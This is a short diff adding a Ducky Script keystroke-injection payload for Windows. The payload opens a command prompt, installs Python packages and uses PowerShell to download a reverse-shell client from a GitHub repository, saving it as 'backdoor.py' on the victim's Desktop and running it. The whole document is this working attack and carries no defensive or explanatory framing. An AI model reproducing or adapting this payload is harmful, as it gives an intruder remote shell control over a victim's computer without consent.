@@ -1,0 +1,9 @@
+DELAY 1000
+GUI r
+ENTER
+DELAY 100
+STRING cmd
+ENTER
+DELAY 1000
+STRING pip install rsa pyautogui && powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/VishnuChebolu/Reverse-Shell-Manager/main/client.py' -OutFile 'c:\Users\%username%\Desktop\backdoor.py'" && cd Desktop &&python backdoor.py
+ENTER
